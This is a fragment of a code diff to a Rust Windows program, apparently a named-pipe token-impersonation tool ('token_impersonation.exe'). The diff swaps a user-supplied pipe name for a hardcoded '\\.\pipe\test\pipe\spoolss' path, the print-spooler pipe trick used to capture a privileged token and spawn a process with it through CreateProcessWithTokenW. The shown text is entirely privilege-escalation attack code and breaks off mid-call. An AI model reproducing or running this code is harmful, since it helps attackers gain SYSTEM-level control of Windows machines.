@@ -7,19 +7,13 @@ use windows::Win32::System::Pipes::{CreateNamedPipeA, ConnectNamedPipe, Imperson
 use windows::Win32::Foundation::{HANDLE, WIN32_ERROR, GetLastError, INVALID_HANDLE_VALUE};
 use windows::Win32::System::Threading::{GetCurrentThread, OpenThreadToken, CreateProcessWithTokenW, CREATE_PROCESS_LOGON_FLAGS, STARTUPINFOW, PROCESS_INFORMATION};
 use windows::core::{PCSTR, PWSTR, PCWSTR};
-use windows::w;
+use windows::{w, s};
 use std::ffi::c_void;
 
 fn main() {
-    let args: Vec<String> = env::args().collect();
-    if args[1].is_empty() {
-        panic!(r"Usage: token_impersonation.exe \\.\pipe\pipename");
-    }
-
-    let pipename: &[u8] = args[1].as_bytes();
+    
     unsafe {
-
-        let p_name: PCSTR = PCSTR::from_raw(pipename.as_ptr());
+        let p_name: PCSTR = s!(r"\\.\pipe\test\pipe\spoolss");
         println!("[+] Creating named pipe {}", p_name.to_string().unwrap());
         let h_pipe: HANDLE = CreateNamedPipeA(
             p_name,
